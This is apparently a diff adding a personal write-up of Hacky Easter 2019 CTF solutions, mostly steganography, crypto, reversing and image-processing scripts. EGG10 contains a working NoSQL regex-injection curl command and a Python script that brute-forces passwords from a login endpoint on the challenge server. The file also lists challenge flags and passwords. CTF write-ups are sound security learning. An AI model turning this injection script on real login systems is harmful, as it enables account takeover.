@@ -1,0 +1,763 @@
+TEASER
+======
+
+230400 frames = 480x480 pixel ?!?
+
+import cv2
+import numpy as np
+
+egg = np.zeros([480,480,3])
+cap = cv2.VideoCapture('he2019_teaser.mp4')
+
+for y in range(480):
+  for x in range(480):
+    ret, frame = cap.read()
+    egg[y,x] = frame[49:50,49:50]
+    if not ret: break
+cv2.imwrite("egg.png", egg)
+cap.release()
+cv2.destroyAllWindows()
+
+he19-th1s-isju-5tAt-Eazr
+
+
+
+EGG01
+=====
+play around with GIMP
+Filters / Distorts / Whirl and Pinch: Whirl angle 110
+Tools / Transform Tools / Rotate / Angle: -9,00
+he19-Eihb-UUVw-nObm-lxaW
+
+
+
+EGG02
+=====
+this is a manual alphabet. split the animated gif and get the password.  
+convert justWatch.gif justWatch.png
+https://en.wikipedia.org/wiki/American_manual_alphabet
+givemeasign
+he19-DwWd-aUU2-yVhE-SbaG
+
+
+
+EGG03
+=====
+decode with python3
+import base64
+print(bytes.fromhex(hex(int(base64.b64decode('K7sAYzGlYx0kZyXIIPrXxK22DkU4Q+rTGfUk9i9vA60C/ZcQOSWNfJLTu4RpIBy/27yK5CBW+UrBhm0=').hex(),16)//int('5'*101))[2:]).decode())
+n00b_style_crypto
+he19-YPkZ-ZZpf-nbYt-6ZyD
+
+
+
+EGG04
+=====
+with the arrow keys it is possible to dive into the mirror ball.
+The mirrows inside looks somehow like a QR-code. 
+The solution must be hidden in mirrors.js
+
+Make some little modifications to disco2.html and get just the QR-mirrows 
+        for (var i = 0; i < mirrors.length; i++) {
+          var m = mirrors[i];
+          if (Math.abs(m[0]) < 280 & Math.abs(m[1]) < 280 & Math.abs(m[2]) < 100) {
+            mirrorTile = new THREE.Mesh(tileGeom, sphereMaterial);
+            mirrorTile.position.set(m[0], m[1], m[2]);
+            mirrorTile.lookAt( 0.0, 0.0, 999999.0);
+            scene.add(mirrorTile);
+          }
+        }
+
+he19-r5pN-YIRp-2cyh-GWh8
+
+
+
+EGG05
+=====
+there is a hint in docProps\core.xml
+<dc:creator>SCIpher</dc:creator>
+searching in the web leads to following webpage
+https://pdos.csail.mit.edu/archive/scigen/scipher.html
+pasting the text into "Decode your message" and decrypt gives the link to the easter egg.
+https://hackyeaster.hacking-lab.com/hackyeaster/images/eggs/5e171aa074f390965a12fdc240.png
+he19-A6kG-rb9U-Iury-qv93
+
+
+
+EGG06
+=====
+https://de.wikipedia.org/wiki/Flei%C3%9Fnersche_Schablone
+the hidden dots are the two ununsed squares in the 3x3 matrices 
+roatate left
+HELLO<B>UC<K>
+<T>H<E>PASSWO
+<R>DI<S>WHITE
+CHOCOL<A>T<E>
+password WHITECHOCOLATE gives the egg: he19-n3B2-lZTU-LQTJ-nlRC
+
+
+
+EGG07
+=====
+put set -x into the first line
+./eggi.sh abc > eggi.log 2>&1
+the you can find following lines in the log
+
+Cz='\''s:'\''
+qz='\''.p'\''
+fz='\''8a'\''
+az='\''e9'\''
+Oz='\''co'\''
+Xz='\''a6'\''
+hz='\''7e'\''
+Rz='\''im'\''
+Bz='\''tp'\''
+lz='\''62'\''
+Kz='\''in'\''
+Wz='\''s/'\''
+rz='\''ng'\''
+Yz='\''1e'\''
+Jz='\''r.'\''
+Iz='\''te'\''
+Tz='\''es'\''
+Zz='\''f3'\''
+kz='\''15'\''
+Az='\''ht'\''
+Fz='\''ck'\''
+Uz='\''/e'\''
+Sz='\''ag'\''
+Lz='\''g-'\''
+Ez='\''ha'\''
+Vz='\''gg'\''
+Pz='\''m/'\''
+pz='\''8c'\''
+Gz='\''ye'\''
+Dz='\''//'\''
+iz='\''cd'\''
+Hz='\''as'\''
+Mz='\''la'\''
+Nz='\''b.'\''
+nz='\''c7'\''
+Qz='\''r/'\''
+ez='\''d8'\''
+cz='\''ac'\''
+gz='\''12'\''
+bz='\''75'\''
+oz='\''4a'\''
+mz='\''42'\''
+jz='\''6e'\''
+dz='\''b7'\''
+...
+if [[ $match -eq 5 ]]echo "Find your egg at $t"
+ then
+t="$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Ez$Fz$Kz$Lz$Mz$Nz$Oz$Pz$Ez$Fz$Gz$Hz$Iz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$Zz$pz$qz$rz"
+echo "Great, that are the perfect arguments. It took some time, but I'\''m glad, you see it now, too!"
+sleep 2
+if b x-www-browser 
+ then
+x-www-browser $t
+else
+echo "Find your egg at $t"
+fi
+else
+echo "I'\''m not really happy with your arguments. I'\''m still not convinced that those are reasonable statements..."
+echo "low: $low, matched $match, high: $high"
+fi'
+
+Find your egg at https://hackyeaster.hacking-lab.com/hackyeaster/images/eggs/a61ef3e975acb7d88a127ecd6e156242c74af38c.png
+he19-Bxvs-Vno1-9l9D-49gX
+
+
+
+EGG08
+=====
+read with QtQR: remove me
+replace markers with original and read with QtQR: Isn't that a bit too easy?
+
+strings modernart.jpg
+(E7EF085CEBFCE8ED93410ACF169B226A)
+(KEY=1857304593749584) = 699356C8CD650
+
+AES-128 ECB: Ju5t_An_1mag3
+he19-Ydks-4V9o-Hn6p-RZ1A
+
+
+
+EGG09
+=====
+< evihcra.piz xxd -p -c1 | tac | xxd -p -r > archive.zip
+unzip to 90gge.gnp
+just reverse byte 2-4 in the file to PNG and save it to egg09.png
+flip the image horizontal
+negative(invert image)
+he19-VFTD-kVos-DeL1-lATA
+
+
+
+EGG10
+=====
+sending a male formated JSON to http://whale.hacking-lab.com:3371/login gets an error and not just "Unknown user" with HTTP 500
+    <div class="alert alert-danger mt-3" role="alert">
+        <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
+        Unexpected token 
+                          in JSON at position 56
+    </div>
+
+the questions-URL are MongoDB’s ObjectIDs with 12-byte and there are some other hints in the questions.
+so it must be JSON and NoSQL injection
+
+after many attempts with curl the injection was found and the length of the password from username "the_admin"
+curl 'http://whale.hacking-lab.com:3371/Login'  -H 'Content-Type: application/json' --data '{"username":{"$eq":"the_admin"},"password":{"$regex":".{16}"}}'
+Found. Redirecting to /
+
+find the password with a small python script.
+
+import requests
+import string
+username="the_admin"
+password=""
+u="http://whale.hacking-lab.com:3371/login"
+headers={'content-type': 'application/json'}
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','$']:
+            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False)
+            if 'Welcome to Stackunderflow!' in r.text:
+                print("Found one more char : %s" % (password+c))
+                password += c
+
+login with the_admin/76eKxMEQFcfG3fPe and find a new question:
+Should my password really be the flag?
+Asked by null
+No, I think we should change it.
+Let's do it after the migration!
+The migration is done but the password is still the same...
+
+ok, let's find the password of user "null"
+same python as above, but with username "null"
+N0SQL_injections_are_a_thing
+
+he19-nq5W-zLwY-iX3Q-iw1Q
+
+
+
+EGG11
+=====
+#!/bin/bash
+curl -c cookies.txt http://whale.hacking-lab.com:1111 > memory.log 2>&1
+for round in {1..10}; do
+  unset memory
+  declare -A memory
+  for card in {1..98}; do
+    MD5=$(curl -b cookies.txt http://whale.hacking-lab.com:1111/pic/${card} | md5sum)
+    if [ ${memory[${MD5}]+_} ]; then
+      echo "${memory[${MD5}]}=${card}" >> memory.log 2>&1
+      curl -b cookies.txt http://whale.hacking-lab.com:1111/solve --data "first=${memory[${MD5}]}&second=${card}" -H 'Content-Type: application/x-www-form-urlencoded' >> memory.log 2>&1
+    else
+      memory[${MD5}]=${card} 
+    fi
+  done
+  curl -b cookies.txt http://whale.hacking-lab.com:1111 >> memory.log 2>&1
+done
+curl -b cookies.txt http://whale.hacking-lab.com:1111 >> memory.log 2>&1
+ok, here is your flag: 1-m3m3-4-d4y-k33p5-7h3-d0c70r-4w4y
+he19-jaQ9-0NIr-Ladc-brOT
+
+
+
+EGG12
+=====
+after testing many passwords it looks like that there is a lot of fake code in decryptor.
+eg.: abcdefghijkl | ./decryptor | od -t x1 --endian=big
+The output XORed with address 0x00601060-0x006013ac returns abcdefghijkl as repeating key.
+So it just looks like a simle XOR cipher
+
+write content of address 0x00601060-0x006013ac to file decryptor.bin and hack it with https://alamot.github.io/xor_kpa/
+python xorknown.py decryptor.bin he19-
+Searching XOR-encrypted decryptor.bin for string 'he19-' (max_key_length = 20)
+Key length: 13 
+Partial Key: �����1th_n��� 
+Plaintext: �����, 
+cong������ou foun������hidden ������he19-Eh������J-3dyS-������
+
+Searching XOR-encrypted decryptor.bin for string 'the hidden ' (max_key_length = 13)
+Key length: 13 
+Partial Key: �0r_w1th_n4n� 
+Plaintext: �ello, 
+cong��ts you foun��the hidden ��ag: he19-Eh��-yuyJ-3dyS-��8U.
+
+Searching XOR-encrypted decryptor.bin for string 'Hello,' (max_key_length = 13)
+Key length: 13 
+Partial Key: x0r_w1������� 
+Plaintext: Hello,�������ats yo������� the h�������lag: h�������s-yuyJ�������N8U. 
+
+python xorknown.py decryptor.bin --key=x0r_w1th_n4nd
+Key length: 13 
+Partial Key: x0r_w1th_n4nd 
+Plaintext: Hello, 
+congrats you found the hidden flag: he19-Ehvs-yuyJ-3dyS-bN8U. 
+
+'The XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed.'
+(https://en.wikipedia.org/wiki/XOR_cipher)
+
+'An XOR gate circuit can be made from four NAND gates. In fact, both NAND and NOR gates are so-called "universal gates" and any logical function can be constructed from either NAND logic or NOR logic alone. If the four NAND gates are replaced by NOR gates, this results in an XNOR gate, which can be converted to an XOR gate by inverting the output or one of the inputs (e.g. with a fifth NOR gate).' 
+(https://en.wikipedia.org/wiki/XOR_gate)
+
+
+
+EGG13
+=====
+reading the symphony with the help of a musician
+48 41 43 4B 5F 4D 45 5F 41 4D 41 44 45 55 53 -> HACK_ME_AMADEUS
+he19-7fEm-jj7g-gpt3-4Mdh
+
+
+
+EGG14
+=====
+
+
+
+
+EGG15
+=====
+scan the steemit blockchain with python. The tricky part was to find the start block.
+
+get_block.py
+from steem.blockchain import Blockchain
+from steem import Steem
+import sys
+class Steem_node():
+    def __init__(self, block, block_count, operation):
+        self.block = block
+        self.end_block = block_count + self.block - 1
+        self.operation = operation
+        self.nodes = ['https://api.steemit.com']
+        self.steem = Steem(nodes=self.nodes)
+        self.b = Blockchain(self.steem)
+        print('Booted\nConnected to: {}'.format(self.nodes[0]))
+
+    def run(self):
+        run = 1
+
+        while run == 1:
+            try:
+                stream = self.b.stream_from(start_block=self.block, end_block=self.end_block, full_blocks=True)
+                for block in stream:
+                    print('\nBlock: ', block['timestamp'], self.block)
+                    transaction_index = 0
+                    for transaction in block['transactions']:
+#                        if transaction['operations'][0][0] == self.operation:
+                        print(transaction_index, transaction['operations'][0][1])
+                        transaction_index += 1
+
+                    if self.block == self.end_block:
+                        run = 0
+                    else:
+                        self.block += 1
+
+            except Exception as e:
+                continue
+
+if __name__ == '__main__':
+    block = int(sys.argv[1])
+    block_count = int(sys.argv[2])
+    operation = sys.argv[3]
+    steem_node = Steem_node(block, block_count, operation)
+steem_node.run()
+
+python3 get_block.py 21170000 100000 comment | grep -i -e 'Hacky Easter' -e 'hackyeaster' -e 'he19-' -e 'Block: '>  get_block.log
+Block:  2018-04-01T14:39:39 21187964
+67 {'from': 'darkstar-42', 'to': 'ctf', 'amount': '0.001 SBD', 'memo': 'Hacky Easter 2019 takes place between April and May 2019. Take a note: nomoneynobunny'}
+he19-TlUu-qs4k-uEbS-xRob
+
+
+
+EGG16
+=====
+import dump to mysql
+mysql -uroot -p he19thing < EveryThing.sql
+
+find types
+SELECT distinct type FROM `Thing` order by type
+address
+address.about
+address.addressread with QtQR: remove me
+address.age
+address.company
+address.email
+address.eyeColor
+address.favoriteFruit
+address.gender
+address.greeting
+address.guid
+address.name
+address.phone
+address.picture
+address.registered
+addressbook
+book
+book.author
+book.isbn
+book.language
+book.title
+book.url
+book.year
+bookshelf
+galery
+png
+png.bkgd
+png.chrm
+png.gama
+png.head
+png.idat
+png.iend
+png.ihdr
+png.phys
+png.text
+png.time
+ROOT
+shelf
+
+galery?
+c51561253f774c5fa161cdc4e1d1ee1f	1 	galery 	My holiday images 	746e24196223496e9d0ba9ceb82705c6
+
+png pictures are good
+SELECT * FROM `Thing` where type = 'png'
+35fd7abc15274e38a513f990d153fc37	9 	png 	Fantastic trail, but a dead end 	c51561253f774c5fa161cdc4e1d1ee1f
+42097903161d41839d5d189b93e580d7	2 	png 	The best dinner ever 	c51561253f774c5fa161cdc4e1d1ee1f
+4651124a8b2f4cdfb7b3cbca94bb7af2	5 	png 	Local market 	c51561253f774c5fa161cdc4e1d1ee1f
+55431a5914314eef97cf9c31e07a95f4	0 	png 	At the beach 	c51561253f774c5fa161cdc4e1d1ee1f
+58a8e910ed9c4fb3b8083fdfbce99628	3 	png 	Me, walking through the wood 	c51561253f774c5fa161cdc4e1d1ee1f
+5bfe2bb8621b46119c7a281960904174	4 	png 	The mountains 	c51561253f774c5fa161cdc4e1d1ee1f
+80dcb19d74354660afdadd761b3df72e	6 	png 	A strange car 	c51561253f774c5fa161cdc4e1d1ee1f
+d39d3ad6fa85453196e46cd30fcd5612	1 	png 	Nice sunset 	c51561253f774c5fa161cdc4e1d1ee1f
+f91fd59c966641b2bb05f2374c6c8199	7 	png 	My first time on a SUP 	c51561253f774c5fa161cdc4e1d1ee1f
+fc7ed04e5e464d3dbf210ed60561ae60	10 	png 	My second time on a SUP 	c51561253f774c5fa161cdc4e1d1ee1f
+
+"A strange car" sounds intersting
+SELECT a.value,b.value FROM `Thing` a left join `Thing` b on a.id = b.pid where HEX(a.pid) ='80dcb19d74354660afdadd761b3df72e' order by a.ord, b.ord
+and export to Thing.csv
+
+cat Thing.csv | base64 -d > Thing.png
+he19-qKaG-VHmv-Mm26-0mwy
+
+
+
+EGG17
+=====
+Is the flag hidden inside filter type?
+Analyse with zpng shows that the filter is either 0 or 1
+zpng --scanlines eggdesign.png 
+#<ZPNG::ScanLine idx=0  offset=0   size=1921 bpp=32 filter=0>
+#<ZPNG::ScanLine idx=1  offset=1921 size=1921 bpp=32 filter=1>
+#<ZPNG::ScanLine idx=2  offset=3842 size=1921 bpp=32 filter=0>
+#<ZPNG::ScanLine idx=3  offset=5763 size=1921 bpp=32 filter=0>
+#<ZPNG::ScanLine idx=4  offset=7684 size=1921 bpp=32 filter=0>
+#<ZPNG::ScanLine idx=5  offset=9605 size=1921 bpp=32 filter=0>
+#<ZPNG::ScanLine idx=6  offset=11526 size=1921 bpp=32 filter=1>
+#<ZPNG::ScanLine idx=7  offset=13447 size=1921 bpp=32 filter=1>
+....
+
+zpng --scanlines eggdesign.png | awk -F "=|>" '{printf "%s", $6}' | perl -lpe '$_=pack"B*",$_'
+Congratulation, here is your flag: he19-TKii-2aVa-cKJo-9QCj
+
+
+
+EGG18
+=====
+a little bit python to brute force callWasm(module.instance)
+
+#get_local $var0
+#i32.const 84
+var0 = 84
+#get_local $var1
+#i32.const 104
+var1 = 104
+#get_local $var2
+#i32.const 51
+var2 = 51
+#get_local $var3
+#i32.const 80
+var3 = 80
+
+validRange = [ 48, 49, 51, 52, 53, 72, 76, 88, 99, 100, 102, 114 ]
+for var4 in validRange:
+  for var9 in validRange:
+    #get_local $var9
+    #get_local $var8
+    #i32.rem_s
+    #i32.const 40
+    var8 = var9 - 40 
+    if ( var8 in validRange ):
+      #get_local $var9
+      #get_local $var4
+      #i32.rem_s
+      #i32.const 2
+      #i32.mul
+      #get_local $var13
+      var13 = var9%var4*2
+      if ( var13 in validRange ):
+        #get_local $var13
+        #get_local $var6
+        #i32.rem_s
+        #i32.const 20
+        for var6 in validRange:
+          if ( var13%var6 == 20 ):
+            #get_local $var5
+            #get_local $var9
+            #i32.sub
+            #get_local $var19
+            #i32.add
+            #i32.const 79
+            for var19 in validRange:
+              var5  = var9 - var19 + 79
+              if ( var5 in validRange ):
+                #get_local $var5
+                #get_local $var7
+                #i32.sub
+                #i32.const 14
+                var7 = var5 - 14
+                if ( var7 in validRange ):
+                  #get_local $var7
+                  #get_local $var6
+                  #i32.rem_s
+                  #get_local $var10
+                  var10 = var7%var6
+                  if ( var10 in validRange ):
+                     #get_local $var11
+                     #get_local $var13
+                     #i32.rem_s
+                     #get_local $var21
+                     #i32.const 46
+                     #i32.sub
+                     for var11 in validRange:
+                       var21 = var11%var13+46
+                       if ( var21 in validRange ):
+                         #get_local $var7
+                         #get_local $var14
+                         #i32.sub
+                         #get_local $var20
+                         for var14 in validRange:
+                           var20 = var7 - var14
+                           if ( var20 in validRange ):
+                             #get_local $var14
+                             #i32.const 1
+                             #i32.add
+                             #get_local $var15
+                             var15 = var14 + 1
+                             if ( var15 in validRange ):
+                               #get_local $var22
+                               #get_local $var15
+                               var22 = var15
+                               #get_local $var23
+                               #get_local $var22
+                               #i32.rem_s
+                               #i32.const 2
+                               for var23 in validRange:
+                                 if ( var23%var22 == 2 ):
+                                   #get_local $var23
+                                   #get_local $var17
+                                   var17 = var23
+                                   #get_local $var5
+                                   #get_local $var9
+                                   #i32.sub
+                                   #get_local $var19
+                                   #i32.add
+                                   #i32.const 79
+                                   var19 = var9 - var5 + 79
+                                   if ( var19 in validRange ):
+                                     #get_local $var12
+                                     #get_local $var16
+                                     for var12 in validRange:
+                                       var16 = var12
+                                       var18 = 1352 - (var4 + var5 + var6 + var7 + var8 + var9 + var10 + var11 + var12 + var13 + var14 + var15 + var16 + var17 + var19 + var20 + var21 + var22 + var23)
+                                       if ( var18 in validRange ):
+                                         print(chr(var0)+chr(var1)+chr(var2)+chr(var3)+chr(var4)+chr(var5)+chr(var6)+chr(var7)+chr(var8)+chr(var9)+chr(var10)+chr(var11)+chr(var12)+chr(var13)+chr(var14)+chr(var15)+chr(var16)+chr(var17)+chr(var18)+chr(var19)+chr(var20)+chr(var21)+chr(var22)+chr(var23))
+
+Th3P4r4d0X0fcH01c3154L13 -> he19-DJXj-nL5q-BrfK-7z1x
+
+
+
+EGG19
+=====
+
+
+
+EGG20
+=====
+for each line find follwing BGR entries, where two colors are 0
+  y   x B G R
+135  21 0 0 5
+135  88 5 0 0
+135 184 0 5 0 
+
+line 135 will get to line 5
+color red (0 0 5) has a offset of 21
+color blue (5 0 0) has a offset of 88
+color green (0 5 0) has a offset of 184
+repeat this with every line 
+
+eggsort.py
+import cv2
+import numpy as np
+from matplotlib import pyplot as plt
+
+# read image into matrix.
+img =  cv2.imread("egg.png")
+# get image properties.
+h,w,bpp = np.shape(img)
+#print(h,w,bpp)
+eggsort1 = np.zeros((h,w-3,3), np.uint8)
+eggsort2 = np.zeros((h,w-3,3), np.uint8)
+
+# iterate over the entire image.
+# BLUE = 0, GREEN = 1, RED = 2.   
+for py in range(0,h):
+    offset = 0
+    for px in range(0,w):
+         if ( img[py][px][2] == 0 and img[py][px][1] == 0 ):
+            new_py  = img[py][px][0]
+            pxb_offset = px-offset
+            offset += 1
+         elif ( img[py][px][2] == 0 and img[py][px][0] == 0 ):
+            pxg_offset = px-offset
+            offset += 1
+         elif ( img[py][px][1] == 0 and img[py][px][0] == 0 ):
+            pxr_offset = px-offset
+            offset += 1
+         else:
+            eggsort1[py][px-offset][0] = img[py][px][0]
+            eggsort1[py][px-offset][1] = img[py][px][1]
+            eggsort1[py][px-offset][2] = img[py][px][2]
+    for px in range(0,w-3):
+         eggsort2[new_py][(px-pxb_offset+255)%256][0] = eggsort1[py][px][0]
+         eggsort2[new_py][(px-pxg_offset+255)%256][1] = eggsort1[py][px][1]
+         eggsort2[new_py][(px-pxr_offset+255)%256][2] = eggsort1[py][px][2]
+
+cv2.imwrite("eggsort2.png", eggsort2)
+
+he19-BBPQ-I4xS-ca9b-65vk
+
+
+
+EGG21
+=====
+
+EGG22
+=====
+
+EGG23
+=====
+
+EGG24
+=====
+solve it with a little bit shellscripting, curl, ImageMagick and cv2 in python
+
+#!/bin/bash
+curl -c cookies.txt http://whale.hacking-lab.com:3555 > egg_detection.log 2>&1
+for round in {1..99}; do
+  curl -b cookies.txt http://whale.hacking-lab.com:3555/picture > picture${round}.jpg
+  convert picture${round}.jpg -unsharp 0.5x0.5+999+0.05 picture${round}a.jpg
+  COUNT=$( python3 egg_detection_color.py picture${round}a.jpg )
+  echo ${COUNT}
+#  read COUNT
+  curl -b cookies.txt http://whale.hacking-lab.com:3555/verify --data "s=${COUNT}" -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' >> egg_detection.log 
+  curl -b cookies.txt http://whale.hacking-lab.com:3555 >> egg_detection.log 2>&1
+done
+curl -b cookies.txt http://whale.hacking-lab.com:3555 >> egg_detection.log 2>&1
+
+
+egg_detection_color.py
+import numpy as np
+import math
+import cv2
+import sys
+
+eggCount = 0
+picture = cv2.imread(sys.argv[1])
+
+height = np.size(picture, 0)
+width  = np.size(picture, 1)
+coord = []
+
+def findEggs(contours,eggCount,coord):
+  count=0
+  for i in range(len(contours)):
+    overlap = 0
+    contour = contours[i]
+    if len(contour) >= 25:
+      (x, y, w, h) = cv2.boundingRect(contour)
+      ellipse = cv2.fitEllipse(contour)
+      (center, axis, angle) = ellipse
+      coordXContour, coordYContour = int(center[0]), int(center[1])
+      ax1, ax2 = int(axis[0]) - 2, int(axis[1]) - 2
+      orientation = int(angle)
+      if (w > 20 and h > 20 and cv2.contourArea(contour) > 400):
+        for i in range(len(coord)):
+          if ( abs(coord[i][0]-coordXContour) < 30 and abs(coord[i][1]-coordYContour) < 30 ):
+            overlap = 1
+            break
+        if ( overlap == 0 ):
+          count += 1
+          coord.append([coordXContour, coordYContour, ax1, ax2, orientation, cv2.contourArea(contour)])
+          cv2.putText(picture, "{}".format(str(count+eggCount)), (int(x), int(y+h/2+5)), cv2.FONT_HERSHEY_SIMPLEX, 0.5,(0, 0, 0), 2)
+        cv2.rectangle(picture, (x, y), (x+w, y+h), (0, 0, 0), 2)
+  return count
+
+hsv = cv2.cvtColor(picture, cv2.COLOR_BGR2HSV)
+#defining the range of brown color
+brown1 = cv2.inRange(hsv, np.array([10,89,152],np.uint8), np.array([25,155,195],np.uint8))
+(_,contours,hierarchy)=cv2.findContours(brown1,cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+eggCount = eggCount + findEggs(contours,eggCount,coord)
+brown2 = cv2.inRange(hsv, np.array([5,125,100],np.uint8), np.array([40,160,120],np.uint8))
+(_,contours,hierarchy)=cv2.findContours(brown2,cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+eggCount = eggCount + findEggs(contours,eggCount,coord)
+#defining the range of blue color
+blue = cv2.inRange(hsv, np.array([94, 80, 150],np.uint8), np.array([127, 255, 200],np.uint8))
+(_,contours,hierarchy)=cv2.findContours(blue,cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+eggCount = eggCount + findEggs(contours,eggCount,coord)
+#defining the range of indigo color
+indigo = cv2.inRange(hsv, np.array([120, 30, 70],np.uint8), np.array([180, 100, 255],np.uint8))
+(_,contours,hierarchy)=cv2.findContours(indigo,cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+eggCount = eggCount + findEggs(contours,eggCount,coord)
+#defining the range of gold color
+gold = cv2.inRange(hsv, np.array([1,140,150],np.uint8), np.array([40,190,225],np.uint8))
+(_,contours,hierarchy)=cv2.findContours(gold,cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+eggCount = eggCount + findEggs(contours,eggCount,coord)
+
+cv2.putText(picture, "Eggs found: {}".format(str(eggCount)), (10, 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5,(0, 0, 0), 2)
+cv2.imwrite(sys.argv[1] + ".jpg", picture)
+
+print(eggCount)
+cv2.destroyAllWindows()
+
+in egg_detection.log the flag can be found after round 42
+he19-s7Jj-mO4C-rP13-ySsJ
+
+
+
+EGG25
+=====
+goto menu Eggs and download flags.jpg
+strings flags.jpg | grep he19
+he19-xzCc-xElf-qJ4H-jay8
+
+
+
+EGG26
+=====
+in https://hackyeaster.hacking-lab.com/hackyeaster/css/source-sans-pro.css
+following url can be found url('../fonts/TTF/Egg26.ttf')
+which is in fact Egg26.png
+he19-CuSV-SNEu-McPd-7eEg
+
+
+
+EGG27
+=====
+
+
+
+
